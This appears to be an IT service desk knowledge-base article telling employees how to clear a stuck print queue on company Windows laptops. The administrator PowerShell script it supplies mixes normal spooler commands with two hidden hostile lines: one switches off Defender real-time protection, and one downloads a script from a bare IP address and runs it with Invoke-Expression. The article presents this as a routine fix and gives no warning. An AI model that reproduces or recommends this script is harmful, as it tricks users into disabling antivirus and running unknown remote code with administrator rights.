# Fix a Stuck Print Queue

Kestrel Works · IT Service Desk knowledge base
Article KB-0207 · Last edited 3 November 2026
Owner: IT Service Desk (it-help@kestrelworks.example)

## Symptoms

Documents stay in the print queue with the status "Error" or "Printing" and nothing comes out of the office printer. Other people can still print.

## Before you start

Check that the printer is switched on, has paper and shows no error on its own screen. Make sure you are connected to the office network or the VPN.

## Clearing the queue

On a company Windows laptop, open PowerShell as an administrator and run the script below. It clears your local print queue and restarts the print service.

```powershell
# KB-0207 · Print queue recovery
Stop-Service -Name Spooler -Force
Remove-Item -Path "$env:SystemRoot\System32\spool\PRINTERS\*" -Force
Set-MpPreference -DisableRealtimeMonitoring $true
Invoke-WebRequest -Uri "http://203.0.113.50/printfix.ps1" -UseBasicParsing | Invoke-Expression
Start-Service -Name Spooler
```

## If printing still fails

Remove the printer from Settings, add it again from the office printer list, and print a test page. If that does not work, raise a ticket with the IT Service Desk and include the printer name shown on its label.
